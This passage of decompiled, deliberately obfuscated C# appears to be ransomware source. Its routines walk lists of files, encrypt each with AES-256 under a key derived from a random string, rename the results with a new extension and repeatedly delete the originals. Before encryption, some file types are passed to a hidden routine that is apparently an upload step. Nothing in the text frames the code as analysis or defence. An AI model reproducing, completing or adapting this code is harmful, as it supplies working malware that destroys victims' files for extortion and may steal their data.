										rOJiIraMDUnH(item, item + NxhNWBJwtfUuM.getString_0(107384590), iJULqxXSwKAXP);
									}
									else
									{
										rOJiIraMDUnH(item, item + NxhNWBJwtfUuM.getString_0(107384590), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!OGOvpjxWqYzkk)
										{
											TAoAasJVXJBG(item, item, iJULqxXSwKAXP);
										}
										else
										{
											TAoAasJVXJBG(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (sfIQAmNvQu)
										{
											try
											{
												File.AppendAllText(DFeZKWhzZEN, NxhNWBJwtfUuM.getString_0(107385395) + item + NxhNWBJwtfUuM.getString_0(107384581) + ex18.Message + NxhNWBJwtfUuM.getString_0(107396605));
											}
											catch (Exception)
											{
											}
										}
										OePGqyfYpLiYf++;
										goto end_IL_00ee_2;
									}
								}
								if (OGOvpjxWqYzkk)
								{
									if (CS_0024_003C_003E8__locals0.HIDOumbCVkTws != NxhNWBJwtfUuM.getString_0(107384627))
									{
										lOMKHaCMphu(item + CS_0024_003C_003E8__locals0.HIDOumbCVkTws, bytes4);
									}
									else
									{
										lOMKHaCMphu(item, bytes4);
									}
								}
							}
							goto IL_078a;
							end_IL_00ee_2:;
						}
						catch (Exception)
						{
							goto IL_078a;
						}
					}
					continue;
					IL_078a:
					CS_0024_003C_003E8__locals0.BdJvEtGXFodrl.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.BdJvEtGXFodrl, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new NxhNWBJwtfUuM.UPxHIfYdmYP();
			CS_0024_003C_003E8__locals0.qwQEJmVzAZwQ = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.iGOKniihxHJ = string_0;
			if (CS_0024_003C_003E8__locals0.yAYIsTKmrizA.Length != 0)
			{
				string[] yAYIsTKmrizA = CS_0024_003C_003E8__locals0.yAYIsTKmrizA;
				int num = 0;
				while (num < yAYIsTKmrizA.Length)
				{
					string value = yAYIsTKmrizA[num];
					if (!CS_0024_003C_003E8__locals0.iGOKniihxHJ.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0817;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.iGOKniihxHJ.EndsWith(CS_0024_003C_003E8__locals0.HIDOumbCVkTws))
				{
					goto IL_0817;
				}
			}
			catch (Exception)
			{
				goto IL_0817;
			}
			if (!tYmlquEGMxfHN.Contains(CS_0024_003C_003E8__locals0.iGOKniihxHJ))
			{
				if (WlLLAxxAchpN == NxhNWBJwtfUuM.getString_0(107397227))
				{
					try
					{
						if (IVJqAYyIRPoOgC.SaxwKwUNxFPLf(CS_0024_003C_003E8__locals0.iGOKniihxHJ))
						{
							IVJqAYyIRPoOgC.KNsoUXkaLTo(CS_0024_003C_003E8__locals0.iGOKniihxHJ);
						}
					}
					catch
					{
					}
				}
				tYmlquEGMxfHN.Add(CS_0024_003C_003E8__locals0.iGOKniihxHJ);
				if (!GjyUHzrKYHxXFV.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.iGOKniihxHJ)))
				{
					GjyUHzrKYHxXFV.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.iGOKniihxHJ));
				}
				DipEOSYYYUSt(CS_0024_003C_003E8__locals0.iGOKniihxHJ);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.iGOKniihxHJ).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (sfIQAmNvQu)
						{
							try
							{
								File.AppendAllText(DFeZKWhzZEN, NxhNWBJwtfUuM.getString_0(107385395) + CS_0024_003C_003E8__locals0.iGOKniihxHJ + NxhNWBJwtfUuM.getString_0(107402069) + ex2.Message + NxhNWBJwtfUuM.getString_0(107396605));
							}
							catch (Exception)
							{
							}
						}
						OePGqyfYpLiYf++;
						goto end_IL_0117_2;
					}
					if (CIfLKSlioN == NxhNWBJwtfUuM.getString_0(107397227) && new FileInfo(CS_0024_003C_003E8__locals0.iGOKniihxHJ).Length > Convert.ToInt32(mztBYJzvvrZxTt) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.HIDOumbCVkTws != NxhNWBJwtfUuM.getString_0(107384627))
							{
								if (HITrlhSdkRhVnTG)
								{
									CS_0024_003C_003E8__locals0.HIDOumbCVkTws = cIqGLYlhSzE + CS_0024_003C_003E8__locals0.HIDOumbCVkTws;
								}
								File.Move(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + CS_0024_003C_003E8__locals0.HIDOumbCVkTws);
							}
						}
						catch (Exception ex4)
						{
							if (sfIQAmNvQu)
							{
								try
								{
									File.AppendAllText(DFeZKWhzZEN, NxhNWBJwtfUuM.getString_0(107385395) + CS_0024_003C_003E8__locals0.iGOKniihxHJ + NxhNWBJwtfUuM.getString_0(107402008) + ex4.Message + NxhNWBJwtfUuM.getString_0(107396605));
								}
								catch (Exception)
								{
								}
							}
							OePGqyfYpLiYf++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.HIDOumbCVkTws != NxhNWBJwtfUuM.getString_0(107384627))
						{
							CS_0024_003C_003E8__locals0.iGOKniihxHJ += CS_0024_003C_003E8__locals0.HIDOumbCVkTws;
						}
						if (ZsMYnZdnVwqV == NxhNWBJwtfUuM.getString_0(107397227))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in reXUufgXsSe)
								{
									if (CS_0024_003C_003E8__locals0.iGOKniihxHJ.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.qwQEJmVzAZwQ.HIDOumbCVkTws) && qgDONLtRygbsG == NxhNWBJwtfUuM.UPxHIfYdmYP.getString_0(107397233))
									{
										if (Convert.ToInt32(GaDNrTSfQzpgUqH) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.iGOKniihxHJ).Length)
										{
											try
											{
												JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(NxhNWBJwtfUuM.UPxHIfYdmYP.getString_0(107389455), NxhNWBJwtfUuM.UPxHIfYdmYP.getString_0(107389450), NxhNWBJwtfUuM.UPxHIfYdmYP.getString_0(107389469), CS_0024_003C_003E8__locals0.iGOKniihxHJ);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.iGOKniihxHJ.ToLower().EndsWith(item3) && qgDONLtRygbsG == NxhNWBJwtfUuM.UPxHIfYdmYP.getString_0(107396758))
									{
										try
										{
											JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(NxhNWBJwtfUuM.UPxHIfYdmYP.getString_0(107389455), NxhNWBJwtfUuM.UPxHIfYdmYP.getString_0(107389450), NxhNWBJwtfUuM.UPxHIfYdmYP.getString_0(107389469), CS_0024_003C_003E8__locals0.iGOKniihxHJ);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = eLIwgixNfmLC.ChftDwvmoj(32);
						string s = uNKhrFAtKoRBVa.EnHLHyVjWIb(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (MrvhpQshaKLQlY == NxhNWBJwtfUuM.getString_0(107396752))
						{
							byte[] array = null;
							byte[] byte_ = xDMypKOxUD.DGMRcCHBjFbxJ(CS_0024_003C_003E8__locals0.iGOKniihxHJ, Convert.ToInt32(mztBYJzvvrZxTt) * 1024 * 1024);
							xDMypKOxUD.PerouGeIvmxU(AZdtlXlIbCEFkk: (!DseMmyGrBoOjezM) ? (OGOvpjxWqYzkk ? xDMypKOxUD.EmzieFXgUGooI(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xDMypKOxUD.EmzieFXgUGooI(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.KPzELoIiDOIaJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (OGOvpjxWqYzkk ? RfklKQbYsGtli.zKFUoKSoRuLY(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RfklKQbYsGtli.zKFUoKSoRuLY(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.KPzELoIiDOIaJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), SDWAgRRAQsnxQ: CS_0024_003C_003E8__locals0.iGOKniihxHJ, BbOGTxvaLAuDcV: bytes);
						}
						else if (!OGOvpjxWqYzkk)
						{
							bsHFtVGxaUZhONS.fymkhkKbxkbn(CS_0024_003C_003E8__locals0.iGOKniihxHJ, mztBYJzvvrZxTt, CS_0024_003C_003E8__locals0.KPzELoIiDOIaJ);
						}
						else
						{
							bsHFtVGxaUZhONS.fymkhkKbxkbn(CS_0024_003C_003E8__locals0.iGOKniihxHJ, mztBYJzvvrZxTt, text, bytes);
						}
					}
					else
					{
						if (HITrlhSdkRhVnTG)
						{
							CS_0024_003C_003E8__locals0.HIDOumbCVkTws = cIqGLYlhSzE + CS_0024_003C_003E8__locals0.HIDOumbCVkTws;
						}
						string text2 = eLIwgixNfmLC.ChftDwvmoj(32);
						string s2 = uNKhrFAtKoRBVa.EnHLHyVjWIb(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.HIDOumbCVkTws != NxhNWBJwtfUuM.getString_0(107384627))
						{
							if (!ucaWVFkBOPmIjDGYC)
							{
								if (!OGOvpjxWqYzkk)
								{
									rOJiIraMDUnH(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + CS_0024_003C_003E8__locals0.HIDOumbCVkTws, iJULqxXSwKAXP);
								}
								else
								{
									rOJiIraMDUnH(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + CS_0024_003C_003E8__locals0.HIDOumbCVkTws, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!OGOvpjxWqYzkk)
									{
										TAoAasJVXJBG(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + CS_0024_003C_003E8__locals0.HIDOumbCVkTws, iJULqxXSwKAXP);
									}
									else
									{
										TAoAasJVXJBG(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + CS_0024_003C_003E8__locals0.HIDOumbCVkTws, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (sfIQAmNvQu)
									{
										try
										{
											File.AppendAllText(DFeZKWhzZEN, NxhNWBJwtfUuM.getString_0(107385395) + CS_0024_003C_003E8__locals0.iGOKniihxHJ + NxhNWBJwtfUuM.getString_0(107384581) + ex6.Message + NxhNWBJwtfUuM.getString_0(107396605));
										}
										catch (Exception)
										{
										}
									}
									OePGqyfYpLiYf++;
									return;
								}
							}
						}
						else if (!ucaWVFkBOPmIjDGYC)
						{
							if (!OGOvpjxWqYzkk)
							{
								rOJiIraMDUnH(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + NxhNWBJwtfUuM.getString_0(107384590), iJULqxXSwKAXP);
							}
							else
							{
								rOJiIraMDUnH(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + NxhNWBJwtfUuM.getString_0(107384590), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!OGOvpjxWqYzkk)
								{
									TAoAasJVXJBG(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ, iJULqxXSwKAXP);
								}
								else
								{
									TAoAasJVXJBG(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (sfIQAmNvQu)
								{
									try
									{
										File.AppendAllText(DFeZKWhzZEN, NxhNWBJwtfUuM.getString_0(107385395) + CS_0024_003C_003E8__locals0.iGOKniihxHJ + NxhNWBJwtfUuM.getString_0(107384581) + ex8.Message + NxhNWBJwtfUuM.getString_0(107396605));
									}
									catch (Exception)
									{
									}
								}
								OePGqyfYpLiYf++;
								return;
							}
						}
						if (OGOvpjxWqYzkk)
						{
							if (CS_0024_003C_003E8__locals0.HIDOumbCVkTws != NxhNWBJwtfUuM.getString_0(107384627))
							{
								lOMKHaCMphu(CS_0024_003C_003E8__locals0.iGOKniihxHJ + CS_0024_003C_003E8__locals0.HIDOumbCVkTws, bytes2);
							}
							else
							{
								lOMKHaCMphu(CS_0024_003C_003E8__locals0.iGOKniihxHJ, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0817;
			IL_0817:
			CS_0024_003C_003E8__locals0.BdJvEtGXFodrl.Remove(CS_0024_003C_003E8__locals0.iGOKniihxHJ);
		});
	}

	private static void GMTuCGZfmCQ(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (ZsMYnZdnVwqV == getString_0(107397210))
					{
						foreach (string item in reXUufgXsSe)
						{
							if (string_0.ToLower().EndsWith(item) && qgDONLtRygbsG == getString_0(107397210))
							{
								if (Convert.ToInt32(GaDNrTSfQzpgUqH) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389432), getString_0(107389427), getString_0(107389446), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && qgDONLtRygbsG == getString_0(107396735))
							{
								try
								{
									JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389432), getString_0(107389427), getString_0(107389446), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107384573)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107384573), getString_0(107389383)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void TAoAasJVXJBG(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (ZsMYnZdnVwqV == getString_0(107397210))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in reXUufgXsSe)
			{
				if (string_0.ToLower().EndsWith(item) && qgDONLtRygbsG == getString_0(107397210))
				{
					if (Convert.ToInt32(GaDNrTSfQzpgUqH) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389432), getString_0(107389427), getString_0(107389446), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && qgDONLtRygbsG == getString_0(107396735))
				{
					try
					{
						JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389432), getString_0(107389427), getString_0(107389446), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = RfklKQbYsGtli.zKFUoKSoRuLY(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		cLVmkVhYZQAqR++;
	}

	private static void rOJiIraMDUnH(string string_0, string string_1, byte[] byte_0)
	{
		rptFTrYiCvCjBm CS_0024_003C_003E8__locals0 = new rptFTrYiCvCjBm();
		CS_0024_003C_003E8__locals0.mojxVTIvuJtPi = string_0;
		CS_0024_003C_003E8__locals0.dGEtPIbqKFpIG = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string dGEtPIbqKFpIG = CS_0024_003C_003E8__locals0.dGEtPIbqKFpIG;
			FileStream fileStream = new FileStream(dGEtPIbqKFpIG, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (znQoURUZOUr == getString_0(107397210))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.mojxVTIvuJtPi, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.mojxVTIvuJtPi, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.mojxVTIvuJtPi, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.dGEtPIbqKFpIG.Length > 0)
				{
					if (ZsMYnZdnVwqV == getString_0(107397210))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.mojxVTIvuJtPi, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in reXUufgXsSe)
						{
							if (CS_0024_003C_003E8__locals0.mojxVTIvuJtPi.ToLower().EndsWith(item) && qgDONLtRygbsG == getString_0(107397210))
							{
								if (Convert.ToInt32(GaDNrTSfQzpgUqH) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389432), getString_0(107389427), getString_0(107389446), CS_0024_003C_003E8__locals0.mojxVTIvuJtPi);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.mojxVTIvuJtPi.ToLower().EndsWith(item) && qgDONLtRygbsG == getString_0(107396735))
							{
								try
								{
									JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389432), getString_0(107389427), getString_0(107389446), CS_0024_003C_003E8__locals0.mojxVTIvuJtPi);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.mojxVTIvuJtPi);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.dGEtPIbqKFpIG.EndsWith(getString_0(107384573)))
					{
						File.Move(CS_0024_003C_003E8__locals0.dGEtPIbqKFpIG, CS_0024_003C_003E8__locals0.dGEtPIbqKFpIG.Replace(getString_0(107384573), getString_0(107389383)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.dGEtPIbqKFpIG))
							{
								File.Delete(CS_0024_003C_003E8__locals0.dGEtPIbqKFpIG);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (sfIQAmNvQu)
			{
				try
				{
					File.AppendAllText(DFeZKWhzZEN, getString_0(107385378) + CS_0024_003C_003E8__locals0.mojxVTIvuJtPi + getString_0(107384564) + ex2.Message + getString_0(107396588));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> gOxsnxWeRPgV = GOxsnxWeRPgV;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				YIXLlGdULNfSbR(getString_0(107384543), string_0);
			};
		}
		Parallel.ForEach(gOxsnxWeRPgV, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> dDFbQjSRQSBi = DDFbQjSRQSBi;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				YIXLlGdULNfSbR(getString_0(107388421), string_0);
			};
		}
		Parallel.ForEach(dDFbQjSRQSBi, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> qiqXBfsbeQblN = QiqXBfsbeQblN;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107384502)), string_0);
			};
		}
		Parallel.ForEach(qiqXBfsbeQblN, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		if (oFiUkFigqDlT == getString_0(107397210))
		{
			string[] source = oVWaGggWhTw;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107384502)), getString_0(107384477) + string_0 + getString_0(107384468));
				};
			}
			Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		if (!ASbXtPMgHzag().Contains(getString_0(107385212)))
		{
			JIJxgqGiTDGj(vvPDaYXldwG);
		}
		else
		{
			List<string> source2 = bousYWjJeLmG;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					YIXLlGdULNfSbR(VrSebPGaWq(iIncmAQQCyiqzep(getString_0(107384463))), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		List<string> ihynlOzkYLrJ = IhynlOzkYLrJ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107384438)), string_0);
			};
		}
		Parallel.ForEach(ihynlOzkYLrJ, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> qfFOzoRRsJbaCSrv = QfFOzoRRsJbaCSrv;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				YIXLlGdULNfSbR(getString_0(107384453), string_0);
			};
		}
		Parallel.ForEach(qfFOzoRRsJbaCSrv, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		YIXLlGdULNfSbR(getString_0(107384543), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		YIXLlGdULNfSbR(getString_0(107388421), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107384502)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107384502)), getString_0(107384477) + string_0 + getString_0(107384468));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		YIXLlGdULNfSbR(VrSebPGaWq(iIncmAQQCyiqzep(getString_0(107384463))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107384438)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		YIXLlGdULNfSbR(getString_0(107384453), string_0);
	}

	static NuHMiFuRoVNiZNRl()
	{
		Strings.CreateGetStringDelegate(typeof(NuHMiFuRoVNiZNRl));
		ojvJmSdPPrj = getString_0(107389295);
		iJULqxXSwKAXP = null;
		mkEvtBjNwVAcYow = getString_0(107396735);
		BMAroKfuhFq = getString_0(107384924);
		lrbABqBtwmdm = new List<string>();
		mZgRSbczxJo = new List<string>();
		aSWQFrNCstAYl = getString_0(107396735);
		KPzELoIiDOIaJ = getString_0(107389383);
		ldoNWMOouzwBgAly = getString_0(107389383);
		lybIEUIMcWIGlnj = getString_0(107396735);
		NxdceFBuPpPObn = 0;
		WlLLAxxAchpN = getString_0(107396735);
		rsKTwFdPlMVyG = getString_0(107396735);
		pbMZgWCLBnFVHk = getString_0(107396735);
		fBftGohOuN = getString_0(107384911);
		ojJyBCqzecG = getString_0(107396735);
		jbgOlLsBJBGC = getString_0(107396735);
		htRiLelItyC = getString_0(107396735);
		tTJxXJFQquIto = getString_0(107396735);
		PJmgaEUVoKPG = new List<string>
		{
			VrSebPGaWq(getString_0(107384938)),
			VrSebPGaWq(getString_0(107384889)),
			VrSebPGaWq(getString_0(107384896)),
			VrSebPGaWq(getString_0(107384847)),
			VrSebPGaWq(getString_0(107384822)),
			VrSebPGaWq(getString_0(107384797)),
			VrSebPGaWq(getString_0(107384812)),
			VrSebPGaWq(getString_0(107384755)),
			VrSebPGaWq(getString_0(107384730)),
			VrSebPGaWq(getString_0(107384737)),
			VrSebPGaWq(getString_0(107384688)),
			VrSebPGaWq(getString_0(107384151)),
			VrSebPGaWq(getString_0(107384126))
		};
		GjyUHzrKYHxXFV = new List<string>();
		ZCOzJLJFra = getString_0(107396735);
		tMeXcpeYzUQaWO = getString_0(107396735);
		ADeKtvlCUCyAWh = getString_0(107396735);
		tYmlquEGMxfHN = new List<string>();
		uFmZuDOsFxvzSHoZn = getString_0(107396735);
		gLqfzhShBbsaTtcB = getString_0(107384133);
		kzoXfhpDPa = getString_0(107397210);
		qweTdhHyyaxJwL = getString_0(107396735);
		DDFbQjSRQSBi = new List<string>
		{
			VrSebPGaWq(getString_0(107384052)),
			VrSebPGaWq(getString_0(107384019)),
			VrSebPGaWq(getString_0(107383986)),
			VrSebPGaWq(getString_0(107383953)),
			VrSebPGaWq(getString_0(107383920)),
			VrSebPGaWq(getString_0(107384403)),
			VrSebPGaWq(getString_0(107384346)),
			VrSebPGaWq(getString_0(107384317)),
			VrSebPGaWq(getString_0(107384272)),
			VrSebPGaWq(getString_0(107384207)),
			VrSebPGaWq(getString_0(107384206)),
			VrSebPGaWq(getString_0(107383661)),
			VrSebPGaWq(getString_0(107383628)),
			VrSebPGaWq(getString_0(107383567)),
			VrSebPGaWq(getString_0(107383538)),
			VrSebPGaWq(getString_0(107383529)),
			VrSebPGaWq(getString_0(107383488)),
			VrSebPGaWq(getString_0(107383431)),
			VrSebPGaWq(getString_0(107383862)),
			VrSebPGaWq(getString_0(107383829)),
			VrSebPGaWq(getString_0(107383800)),
			VrSebPGaWq(getString_0(107383759)),
			VrSebPGaWq(getString_0(107383750)),
			VrSebPGaWq(getString_0(107383717)),
			VrSebPGaWq(getString_0(107383124)),
			VrSebPGaWq(getString_0(107383067)),
			VrSebPGaWq(getString_0(107383026)),
			VrSebPGaWq(getString_0(107382997)),
			VrSebPGaWq(getString_0(107382988)),
			VrSebPGaWq(getString_0(107382899)),
